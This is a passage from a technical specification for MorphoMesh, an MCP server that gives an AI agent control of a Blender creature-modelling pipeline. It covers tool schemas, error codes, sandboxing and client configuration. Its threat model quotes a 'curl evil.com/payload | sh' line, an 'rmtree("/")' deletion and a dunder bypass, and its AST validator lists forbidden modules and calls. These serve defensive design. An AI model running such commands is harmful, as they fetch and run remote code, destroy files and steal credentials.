    bone_hierarchy: List[str]
    creature_type: str
    has_skin_weights: bool
    test_action_name: Optional[str]
    status: Literal["success", "mock_success"]
```

#### 3.4.5 Error Codes
- `ERR_INPUT_MESH_NOT_FOUND`: Target mesh missing from disk.
- `ERR_ANATOMY_DETECTION_FAILED`: Biomechanical locator failed to identify primary limb clusters.
- `ERR_SKINNING_HEAT_FAILURE`: Blender automatic heat weighting failed to converge; triggers automatic fallback to envelope distance weights.
- `ERR_BLENDER_PROCESS_FAILED`: Subprocess execution or socket transmission failed during rigging.

#### 3.4.6 Example Request & Response
**Request:**
```json
{
  "asset_id": "opt-e83c21a0-4b21-46bb-b31a-637dc49d1052",
  "creature_type": "quadruped",
  "rig_type": "rigify_creature",
  "generate_test_animation": true
}
```
**Response:**
```json
{
  "rigged_asset_id": "rig-341a99f1-a1e0-410d-8519-72c0cba95011",
  "blend_file_path": "/Users/duongnad/Documents/tool/MorphoMesh/.cache/scenes/rig_341a99f1.blend",
  "exported_mesh_path": "/Users/duongnad/Documents/tool/MorphoMesh/.cache/assets/rig_341a99f1.fbx",
  "armature_name": "Armature_Quadruped_Direwolf",
  "bone_count": 42,
  "bone_hierarchy": [
    "root", "pelvis", "spine_01", "spine_02", "neck", "head",
    "thigh.L", "shin.L", "foot.L", "toe.L",
    "thigh.R", "shin.R", "foot.R", "toe.R",
    "shoulder.L", "upper_arm.L", "forearm.L", "hand.L",
    "shoulder.R", "upper_arm.R", "forearm.R", "hand.R",
    "tail_01", "tail_02", "tail_03", "tail_04"
  ],
  "creature_type": "quadruped",
  "has_skin_weights": true,
  "test_action_name": "Action_Quadruped_IdlePose",
  "status": "success"
}
```

---

### 3.5 `morphomesh_blender_execute`

#### 3.5.1 Role in Creature Pipeline
Serves as **Stage 5 / Custom Automation Utility**. Grants the AI agent fine-grained programmatic control over Blender's internal data structures (`bpy`, `bmesh`, `mathutils`). Enforces strict client-side and server-side **AST static analysis** (`BpyCodeValidator`) to completely eliminate risks of arbitrary code execution, unauthorized process creation, or filesystem destruction.

#### 3.5.2 Parameter Table
| Parameter | Type | Required | Default | Validation Bounds / Enums | Description |
|---|---|---|---|---|---|
| `script` | `string` | **Yes** | — | Min 1 char, max 10000 chars | Python script containing `bpy` commands to execute. |
| `timeout_seconds` | `integer`| No | `30` | `1` to `300` | Maximum execution time before aborting process. |
| `target_scene` | `string` | No | `null` | Scene name | Target Blender scene (defaults to active scene). |
| `save_after` | `boolean`| No | `false`| `true`, `false` | Save `.blend` file to disk upon script completion. |
| `save_path` | `string` | No | `null` | File path | File path if `save_after` is True. |
| `return_variables`| `array[str]`| No| `[]` | List of var names | Variable names in script scope to serialize into JSON response. |

#### 3.5.3 JSON Schema (Draft-07 / Pydantic v2)
```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "title": "morphomesh_blender_execute_input",
  "type": "object",
  "properties": {
    "script": {
      "type": "string",
      "minLength": 1,
      "maxLength": 10000,
      "description": "Python script with bpy commands to execute in Blender."
    },
    "timeout_seconds": {
      "type": "integer",
      "minimum": 1,
      "maximum": 300,
      "default": 30,
      "description": "Execution timeout limit in seconds."
    },
    "target_scene": { "type": "string", "description": "Target Blender scene name." },
    "save_after": { "type": "boolean", "default": false, "description": "Save scene after execution." },
    "save_path": { "type": "string", "description": "Destination path for saved .blend file." },
    "return_variables": {
      "type": "array",
      "items": { "type": "string" },
      "default": [],
      "description": "Variable names in script scope to serialize into response."
    }
  },
  "required": ["script"],
  "additionalProperties": false
}
```

#### 3.5.4 Output Schema & Pydantic v2 Models
```python
class BlenderExecuteOutput(BaseModel):
    success: bool
    stdout: str
    stderr: str
    returned_data: Dict[str, Any] = Field(default_factory=dict)
    execution_time_seconds: float
    blend_file_path: Optional[str] = None
```

#### 3.5.5 Error Codes
- `ERR_SCRIPT_SECURITY_VIOLATION`: AST detected forbidden modules (`os`, `subprocess`, `sys`), calls (`eval`, `exec`), or dunder traversal.
- `ERR_SCRIPT_SYNTAX_ERROR`: Script fails Python AST parser.
- `ERR_SCRIPT_EXECUTION_TIMEOUT`: Script exceeded `timeout_seconds`.
- `ERR_SCRIPT_RUNTIME_EXCEPTION`: Uncaught exception during `bpy` execution (stack trace returned in `stderr`).

#### 3.5.6 Example Request & Response
**Request:**
```json
{
  "script": "import bpy\nobj = bpy.context.active_object\nif obj:\n    obj.location.z += 1.0\n    new_z = float(obj.location.z)\nelse:\n    new_z = 0.0\nresult_msg = f'Adjusted {obj.name if obj else None} to Z={new_z}'",
  "return_variables": ["new_z", "result_msg"],
  "timeout_seconds": 15
}
```
**Response:**
```json
{
  "success": true,
  "stdout": "Info: Object translation applied\n",
  "stderr": "",
  "returned_data": {
    "new_z": 2.95,
    "result_msg": "Adjusted Armature_Quadruped_Direwolf to Z=2.95"
  },
  "execution_time_seconds": 0.048,
  "blend_file_path": null
}
```

---

### 3.6 `morphomesh_get_scene_status`

#### 3.6.1 Role in Creature Pipeline
Serves as **Stage 5 / State Inspection Utility**. Traverses the active Blender scene graph, gathering authoritative statistics: object hierarchy, vertex/edge/face counts, modifier stacks, materials, armatures, cameras, and lighting. Enables the agent to verify scene integrity without rendering.

#### 3.6.2 Parameter Table
| Parameter | Type | Required | Default | Validation Bounds / Enums | Description |
|---|---|---|---|---|---|
| `scene_name` | `string` | No | `null` | Scene name | Specific scene to inspect (defaults to active scene). |
| `include_mesh_stats` | `boolean`| No | `true` | `true`, `false` | Return vertex, edge, and polygon counts for meshes. |
| `include_hierarchy` | `boolean`| No | `true` | `true`, `false` | Return parent-child object tree relationships. |
| `include_materials` | `boolean`| No | `true` | `true`, `false` | Inspect Principled BSDF shader networks and textures. |
| `include_armatures` | `boolean`| No | `true` | `true`, `false` | Inspect armatures, bone names, and metarig hierarchies. |
| `include_cameras_lights`| `boolean`| No| `true` | `true`, `false` | List camera focal lengths and light power/types. |

#### 3.6.3 JSON Schema (Draft-07 / Pydantic v2)
```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "title": "morphomesh_get_scene_status_input",
  "type": "object",
  "properties": {
    "scene_name": { "type": "string", "description": "Specific scene name to inspect." },
    "include_mesh_stats": { "type": "boolean", "default": true },
    "include_hierarchy": { "type": "boolean", "default": true },
    "include_materials": { "type": "boolean", "default": true },
    "include_armatures": { "type": "boolean", "default": true },
    "include_cameras_lights": { "type": "boolean", "default": true }
  },
  "additionalProperties": false
}
```

#### 3.6.4 Output Schema & Pydantic v2 Models
```python
class SceneObjectInfo(BaseModel):
    name: str
    type: str
    location: List[float]
    rotation_euler: List[float]
    scale: List[float]
    parent: Optional[str] = None
    children: List[str] = Field(default_factory=list)
    vertex_count: int = 0
    face_count: int = 0
    triangle_count: int = 0
    materials: List[str] = Field(default_factory=list)
    modifiers: List[str] = Field(default_factory=list)

class SceneStatusOutput(BaseModel):
    scene_name: str
    blender_version: str
    active_object: Optional[str] = None
    object_count: int
    total_vertices: int
    total_faces: int
    objects: List[SceneObjectInfo]
    armatures: List[Dict[str, Any]] = Field(default_factory=list)
    cameras: List[Dict[str, Any]] = Field(default_factory=list)
    lights: List[Dict[str, Any]] = Field(default_factory=list)
```

#### 3.6.5 Error Codes
- `ERR_SCENE_NOT_FOUND`: Specified `scene_name` missing from blend data.
- `ERR_BLENDER_OFFLINE`: Socket bridge unreachable and headless runner failed to start.

#### 3.6.6 Example Request & Response
**Request:**
```json
{
  "include_mesh_stats": true,
  "include_armatures": true
}
```
**Response:**
```json
{
  "scene_name": "Scene",
  "blender_version": "5.2.1",
  "active_object": "Armature_Quadruped_Direwolf",
  "object_count": 4,
  "total_vertices": 8120,
  "total_faces": 7980,
  "objects": [
    {
      "name": "Direwolf_Mesh",
      "type": "MESH",
      "location": [0.0, 0.0, 0.0],
      "rotation_euler": [0.0, 0.0, 0.0],
      "scale": [1.0, 1.0, 1.0],
      "parent": "Armature_Quadruped_Direwolf",
      "children": [],
      "vertex_count": 8120,
      "face_count": 7980,
      "triangle_count": 15960,
      "materials": ["M_Direwolf_PBR"],
      "modifiers": ["Armature"]
    },
    {
      "name": "Armature_Quadruped_Direwolf",
      "type": "ARMATURE",
      "location": [0.0, 0.0, 0.0],
      "rotation_euler": [0.0, 0.0, 0.0],
      "scale": [1.0, 1.0, 1.0],
      "parent": null,
      "children": ["Direwolf_Mesh"],
      "vertex_count": 0,
      "face_count": 0,
      "triangle_count": 0,
      "materials": [],
      "modifiers": []
    }
  ],
  "armatures": [
    {
      "name": "Armature_Quadruped_Direwolf",
      "bone_count": 42,
      "root_bones": ["root"]
    }
  ],
  "cameras": [
    { "name": "StudioCamera", "lens_focal_length": 50.0, "type": "PERSP" }
  ],
  "lights": [
    { "name": "KeyLight", "type": "AREA", "energy": 500.0, "color": [1.0, 0.95, 0.9] }
  ]
}
```

---

### 3.7 `morphomesh_render_preview`

#### 3.7.1 Role in Creature Pipeline
Serves as **Stage 5 (Visual Proof & Multi-Angle Viewport Rendering)**. Configures studio lighting (3-point warm/cool key/fill/rim), computes a tight bounding sphere around the creature, frames an auto-targeted camera with 15% padding, renders via Apple Metal-accelerated EEVEE Next, and returns an MCP multipart payload containing a base64 **`ImageContent`** object and structured **`TextContent`** metadata.

#### 3.7.2 Parameter Table
| Parameter | Type | Required | Default | Validation Bounds / Enums | Description |
|---|---|---|---|---|---|
| `camera_name` | `string` | No | `null` | Camera object name | Specific camera to render from (auto-frames if omitted). |
| `resolution_width` | `integer`| No | `1024` | `256` to `4096` | Output render width in pixels. |
| `resolution_height`| `integer`| No | `1024` | `256` to `4096` | Output render height in pixels. |
| `render_engine` | `string` | No | `"BLENDER_EEVEE"`| `BLENDER_EEVEE`, `BLENDER_EEVEE_NEXT`, `CYCLES`, `BLENDER_WORKBENCH` | Rendering engine (auto-normalized to `BLENDER_EEVEE` in Blender 5.2.1). |
| `samples` | `integer`| No | `64` | `1` to `1024` | Number of render samples. |
| `view_angle` | `string` | No | `"three_quarter"` | `front`, `side`, `three_quarter`, `top`, `turntable_4views`, `active_camera` | Camera vantage point. |
| `transparent_background`| `boolean`| No| `true` | `true`, `false` | Enable RGBA transparency. |
| `lighting_preset` | `string` | No | `"studio_three_point"`| `studio_three_point`, `dramatic_rim`, `neutral_softbox`, `outdoor_sun`, `scene_default` | Lighting environment setup. |
| `save_to_disk` | `boolean`| No | `true` | `true`, `false` | Save PNG to persistent cache. |
| `output_dir` | `string` | No | `null` | Directory path | Custom destination directory. |

#### 3.7.3 JSON Schema (Draft-07 / Pydantic v2)
```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "title": "morphomesh_render_preview_input",
  "type": "object",
  "properties": {
    "camera_name": { "type": "string", "description": "Camera object name." },
    "resolution_width": { "type": "integer", "minimum": 256, "maximum": 4096, "default": 1024 },
    "resolution_height": { "type": "integer", "minimum": 256, "maximum": 4096, "default": 1024 },
    "render_engine": {
      "type": "string",
      "enum": ["BLENDER_EEVEE", "BLENDER_EEVEE_NEXT", "CYCLES", "BLENDER_WORKBENCH"],
      "default": "BLENDER_EEVEE"
    },
    "samples": { "type": "integer", "minimum": 1, "maximum": 1024, "default": 64 },
    "view_angle": {
      "type": "string",
      "enum": ["front", "side", "three_quarter", "top", "turntable_4views", "active_camera"],
      "default": "three_quarter"
    },
    "transparent_background": { "type": "boolean", "default": true },
    "lighting_preset": {
      "type": "string",
      "enum": ["studio_three_point", "dramatic_rim", "neutral_softbox", "outdoor_sun", "scene_default"],
      "default": "studio_three_point"
    },
    "save_to_disk": { "type": "boolean", "default": true },
    "output_dir": { "type": "string" }
  },
  "additionalProperties": false
}
```

#### 3.7.4 Output Schema & Pydantic v2 Models
```python
class RenderPreviewInput(BaseModel):
    camera_name: Optional[str] = None
    resolution_width: int = Field(default=1024, ge=256, le=4096)
    resolution_height: int = Field(default=1024, ge=256, le=4096)
    render_engine: Literal["BLENDER_EEVEE", "BLENDER_EEVEE_NEXT", "CYCLES", "BLENDER_WORKBENCH"] = "BLENDER_EEVEE"
    samples: int = Field(default=64, ge=1, le=1024)
    view_angle: Literal["front", "side", "three_quarter", "top", "turntable_4views", "active_camera"] = "three_quarter"
    transparent_background: bool = True
    lighting_preset: Literal["studio_three_point", "dramatic_rim", "neutral_softbox", "outdoor_sun", "scene_default"] = "studio_three_point"
    save_to_disk: bool = True
    output_dir: Optional[str] = None

    @field_validator("render_engine")
    @classmethod
    def normalize_engine(cls, v: str) -> str:
        # Blender 5.2.1 LTS strictly identifies EEVEE Next as 'BLENDER_EEVEE'
        if v == "BLENDER_EEVEE_NEXT":
            return "BLENDER_EEVEE"
        return v

class RenderPreviewOutput(BaseModel):
    image_path: str
    image_format: str = "png"
    resolution: List[int]
    render_engine: str
    samples: int
    render_time_seconds: float
    view_angle: str
    lighting_preset: str
```

#### 3.7.5 Error Codes
- `ERR_NO_CAMERA`: Scene lacks camera and auto-framing creation failed.
- `ERR_RENDER_FAILED`: Blender internal render operator failed or GPU buffer crashed.
- `ERR_OUTPUT_WRITE_FAILED`: Image file cannot be written to destination path.

#### 3.7.6 Example Request & Response (Multipart MCP Format)
**Request:**
```json
{
  "resolution_width": 1024,
  "resolution_height": 1024,
  "render_engine": "BLENDER_EEVEE",
  "view_angle": "three_quarter",
  "lighting_preset": "studio_three_point",
  "transparent_background": true
}
```
**Response (Multipart Array containing `ImageContent` and `TextContent`):**
```json
[
  {
    "type": "image",
    "data": "iVBORw0KGgoAAAANSUhEUgAABAAAAAQACA...",
    "mimeType": "image/png"
  },
  {
    "type": "text",
    "text": "{\n  \"image_path\": \"/Users/duongnad/Documents/tool/MorphoMesh/.cache/renders/preview_three_quarter.png\",\n  \"image_format\": \"png\",\n  \"resolution\": [1024, 1024],\n  \"render_engine\": \"BLENDER_EEVEE\",\n  \"samples\": 64,\n  \"render_time_seconds\": 0.716,\n  \"view_angle\": \"three_quarter\",\n  \"lighting_preset\": \"studio_three_point\"\n}"
  }
]
```

---

## 4. Global Error Taxonomy & Protocol Mapping

### 4.1 Authoritative Error Code Matrix

MorphoMesh enforces a standardized, cross-domain error taxonomy spanning protocol framing, data validation, filesystem access, remote GPU inference, geometry processing, skeletal rigging, execution sandboxing, and inter-process communication:

| Error Code | Symbolic Name | HTTP Equivalent | FastMCP Exception Class | Description & Root Cause | Autonomous Recovery Strategy |
|---|---|---|---|---|---|
| `-32700` | `ERR_PARSE_ERROR` | 400 Bad Request | `ToolError` | Malformed JSON received by the server. | Abort call; re-serialize request string. |
| `-32600` | `ERR_INVALID_REQUEST` | 400 Bad Request | `ToolError` | JSON-RPC structure missing `jsonrpc: "2.0"` or `method`. | Correct payload structure. |
| `-32601` | `ERR_METHOD_NOT_FOUND` | 404 Not Found | `ToolError` | Requested tool name is not registered on FastMCP server. | Query `tools/list` to inspect registered tool names. |
| `-32602` | `ERR_INVALID_ARGUMENT` | 422 Unprocessable | `ToolError` | Pydantic schema validation failure (missing required field, out-of-range value, bad enum). | Inspect validation error detail; clamp or correct parameter. |
| `-32001` | `ERR_IMAGE_NOT_FOUND` | 404 Not Found | `ToolError` | Concept image path does not exist on disk. | Verify file path; regenerate concept via Stage 1. |
| `-32002` | `ERR_BACKEND_UNAVAILABLE`| 503 Service Unavail | `ToolError` | Remote GPU endpoint unreachable, unauthenticated, or down. | Automatically fallback to `MockInferenceAdapter` or local engine. |
| `-32003` | `ERR_VRAM_EXHAUSTED` | 507 Insuff Storage | `ToolError` | Remote GPU Out-Of-Memory (OOM) during 3D diffusion. | Reduce texture resolution (e.g. 2048 to 1024) or batch size. |
| `-32004` | `ERR_REMESH_FAILED` | 500 Internal Error | `ToolError` | QuadriFlow or MeshAnything solver diverged or failed. | Fallback to Voxel Remesh + Decimate modifier pass. |
| `-32005` | `ERR_SKINNING_HEAT_FAILURE`| 500 Internal Error| `ToolError` | Blender bone heat equation failed due to self-intersections. | Fallback to envelope distance weighting or voxel skinning. |
| `-32006` | `ERR_SCRIPT_SECURITY_VIOLATION`| 403 Forbidden | `ToolError` | Script violated AST whitelist (forbidden import, builtin, dunder).| Block execution; log security report. |
| `-32007` | `ERR_TIMEOUT` | 504 Gateway Timeout| `ToolError` | Subprocess or socket operation exceeded execution timeout. | Terminate process; retry with increased timeout limit. |
| `-32008` | `ERR_BLENDER_UNAVAILABLE`| 503 Service Unavail| `ToolError` | Blender socket refused connection and headless binary missing. | Check `BLENDER_PATH` in environment configuration. |
| `-32009` | `ERR_NO_CAMERA` | 404 Not Found | `ToolError` | Scene lacks camera object for viewport rendering. | Automatically spawn procedural studio camera. |
| `-32010` | `ERR_ANATOMY_DETECTION_FAILED`| 422 Unprocessable| `ToolError` | Landmark detector failed to identify limb or spine clusters. | Fallback to generic biped or single bone chain. |

---

### 4.2 JSON-RPC, HTTP, and FastMCP Exception Mapping

MorphoMesh wraps all internal tool exceptions in a central decorator (`@handle_tool_exceptions`) to guarantee uniform JSON-RPC error serialization:

```python
from mcp.server.fastmcp.exceptions import ToolError

class MorphoMeshException(Exception):
    """Base exception for all domain-specific MorphoMesh errors."""
    def __init__(self, code: str, message: str, details: dict | None = None):
        self.code = code
        self.message = message
        self.details = details or {}
        super().__init__(f"[{code}] {message}")

def handle_tool_exceptions(func):
    async def wrapper(*args, **kwargs):
        try:
            return await func(*args, **kwargs)
        except MorphoMeshException as e:
            raise ToolError(f"MorphoMesh Tool Error: [{e.code}] {e.message}")
        except Exception as e:
            raise ToolError(f"Unexpected Tool Failure: {str(e)}")
    return wrapper
```

---

### 4.3 Fault Recovery & Circuit Breaker Logic

To protect agent workflows from transient network spikes or cloud provider outages, remote adapters implement the **Circuit Breaker Pattern**:
1. **Closed (Normal)**: Requests route directly to remote GPU endpoints.
2. **Open (Tripped)**: After 3 consecutive network failures or HTTP 5xx responses, the breaker opens for 60 seconds. All requests immediately fall back to `MockInferenceAdapter` without making network calls.
3. **Half-Open (Testing)**: After 60 seconds, a single canary request tests the remote endpoint. If successful, the breaker resets to Closed; if it fails, the 60-second cooldown restarts.

---

## 5. Security Architecture & Sandboxing

### 5.1 Threat Model for Autonomous DCC Agents

Allowing an autonomous AI agent to execute arbitrary Python scripts inside a local 3D application runtime creates a severe attack surface:
- **Remote Code Execution (RCE)**: Exploitation of shell interpreters via `os.system("curl evil.com/payload | sh")` or `subprocess.Popen`.
- **Filesystem Destruction / Ransomware**: Mass file deletion via `shutil.rmtree("/")` or unauthorized file overwrites.
- **Credential Exfiltration**: Stealing environment variables (`AWS_SECRET_ACCESS_KEY`, `OPENAI_API_KEY`) via `os.environ` or socket network transmissions.
- **Dunder Reflection Bypasses**: Bypassing naive text string filters using Python bytecode inspection and class tree traversal (e.g. `().__class__.__bases__[0].__subclasses__()`).
- **Resource Exhaustion / DoS**: Infinite while loops, memory bombs, or calling `bpy.ops.mesh.subdivide(number_cuts=1000)` causing immediate process freeze.

---

### 5.2 Two-Tier Security Architecture

MorphoMesh enforces defense-in-depth through two distinct tiers:
1. **Tier 1: Strongly Typed Parametric Tools (95% of traffic)**: Tools 1, 2, 3, 4, 6, and 7 execute strictly predefined, parameterized C++/Python routines inside Blender. No code strings are passed or evaluated.
2. **Tier 2: Static Abstract Syntax Tree (AST) Validation (`BpyCodeValidator`)**: Applied to Tool 5 (`morphomesh_blender_execute`). The script is statically parsed into an AST and analyzed node-by-node before transmission to Blender.

---

### 5.3 AST Static Analysis Engine (`BpyCodeValidator`)

The validator visits every node in the AST using `ast.NodeVisitor`:

```python
import ast

class SecurityException(Exception):
    """Raised when an untrusted script violates AST safety rules."""
    pass

class BpyCodeValidator(ast.NodeVisitor):
    ALLOWED_MODULES = {"bpy", "math", "mathutils", "bmesh", "numpy", "random", "json", "collections", "itertools", "time"}
    FORBIDDEN_MODULES = {"os", "sys", "subprocess", "shutil", "socket", "http", "urllib", "requests", "ctypes", "multiprocessing", "threading", "signal", "pty", "importlib", "builtins", "posix"}
    FORBIDDEN_CALLS = {"eval", "exec", "__import__", "compile", "open", "input", "breakpoint", "globals", "locals", "getattr", "setattr", "delattr"}
    FORBIDDEN_ATTRIBUTES = {"__subclasses__", "__globals__", "__code__", "__dict__", "__bases__", "__mro__", "__class__"}

    def visit_Import(self, node: ast.Import):
        for alias in node.names:
            base_module = alias.name.split(".")[0]
            if base_module in self.FORBIDDEN_MODULES or base_module not in self.ALLOWED_MODULES:
                raise SecurityException(f"Forbidden module import: '{alias.name}' on line {node.lineno}.")
        self.generic_visit(node)

    def visit_ImportFrom(self, node: ast.ImportFrom):
        if node.module:
            base_module = node.module.split(".")[0]
            if base_module in self.FORBIDDEN_MODULES or base_module not in self.ALLOWED_MODULES:
                raise SecurityException(f"Forbidden from-import: '{node.module}' on line {node.lineno}.")
        self.generic_visit(node)

    def visit_Call(self, node: ast.Call):
        if isinstance(node.func, ast.Name):
            if node.func.id in self.FORBIDDEN_CALLS:
                raise SecurityException(f"Forbidden built-in call: '{node.func.id}()' on line {node.lineno}.")
        self.generic_visit(node)

    def visit_Attribute(self, node: ast.Attribute):
        if node.attr in self.FORBIDDEN_ATTRIBUTES or (node.attr.startswith("__") and node.attr.endswith("__")):
            raise SecurityException(f"Forbidden dunder attribute access: '{node.attr}' on line {node.lineno}.")
        self.generic_visit(node)
```

#### Dual Verification Rule
AST validation is executed **twice**:
1. First, on the client side in `blender_bridge.py` prior to IPC transmission.
2. Second, inside the Blender addon listener before execution in `bpy.app.timers`.

---

### 5.4 Execution Timeouts & OS Process Isolation

1. **Subprocess Sandboxing**: When running in headless mode, Blender runs under `subprocess.run(timeout=timeout_seconds)`. If execution exceeds the timeout, the bridge sends `SIGTERM`, waits 2.0 seconds, and escalates to `SIGKILL`.
2. **Environment Scrubbing**: When spawning headless Blender subprocesses, sensitive API keys (`REPLICATE_API_TOKEN`, `HF_TOKEN`, `OPENAI_API_KEY`) are scrubbed from the child environment dictionary (`clean_env = {k: v for k, v in os.environ.items() if not k.endswith('_KEY') and not k.endswith('_TOKEN')}`).
3. **Filesystem Confinement**: File operations in Blender are constrained to `.cache/` subdirectories and explicit user project export paths.

---

## 6. Client Integration & Verification Guide

### 6.1 Google Antigravity 2.0 Configuration

To configure MorphoMesh in Google Antigravity 2.0, define the server entry in the agent workspace MCP configuration file (`mcp_config.json`):

```json
{
  "mcpServers": {
    "morphomesh": {
      "command": "python3",
      "args": ["-m", "morphomesh.server"],
      "cwd": "/Users/duongnad/Documents/tool/MorphoMesh",
      "env": {
        "MORPHOMESH_BACKEND": "mock",
        "BLENDER_PATH": "/Applications/Blender.app/Contents/MacOS/Blender",
        "PYTHONPATH": "src"
      }
    }
  }
}
```

---

### 6.2 Python Async Client Conformance Harness

The following standalone Python harness demonstrates standard client initialization, tool listing, and end-to-end execution using the official MCP Python SDK:

```python
# scripts/verify_mcp_client.py
import asyncio
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

async def verify_morphomesh_server():
    server_params = StdioServerParameters(
        command="python3",
        args=["-m", "morphomesh.server"],
        cwd="/Users/duongnad/Documents/tool/MorphoMesh",
        env={"PYTHONPATH": "src", "MORPHOMESH_BACKEND": "mock"}
    )

    async with stdio_client(server_params) as (read_stream, write_stream):
        async with ClientSession(read_stream, write_stream) as session:
            await session.initialize()
            print("Connected to MorphoMesh FastMCP Server.")

            # List tools
            tools_response = await session.list_tools()
            tool_names = [t.name for t in tools_response.tools]
            print(f"Registered Tools ({len(tool_names)}): {tool_names}")
            assert len(tool_names) == 7, f"Expected 7 tools, found {len(tool_names)}"

            # Call Tool 1: Generate Concept
            print("\n[Step 1] Calling morphomesh_generate_concept...")
            concept_res = await session.call_tool(
                "morphomesh_generate_concept",
                arguments={"prompt": "Mythical chimera lion goat snake", "creature_type": "hybrid"}
            )
            print(f"Concept Result: {concept_res.content[0].text[:120]}...")

            # Call Tool 2: Create 3D Asset
            print("\n[Step 2] Calling morphomesh_create_3d_asset...")
            asset_res = await session.call_tool(
                "morphomesh_create_3d_asset",
                arguments={"concept_id": "mock-concept-id", "model_backend": "mock"}
            )
            print(f"3D Asset Result: {asset_res.content[0].text[:120]}...")

            print("\nAll MCP verification checks PASSED successfully.")

if __name__ == "__main__":
    asyncio.run(verify_morphomesh_server())
```

---

### 6.3 Schema Conformance Testing Protocol

To verify that the MCP server schemas remain strictly compliant with Pydantic v2 and the Model Context Protocol, execute the automated test suite:

```bash
# Run tool schema and definition verification
pytest -v tests/test_tools_schema.py

# Run complete offline end-to-end verification
pytest -v tests/
```

All 7 tool definitions must register without syntax errors, validate default parameter bounds, reject malformed payloads with descriptive error codes, and produce exit code 0.

---

*End of MCP Specification — MorphoMesh Protocol Standard `MM-R3-SPEC-001`.*
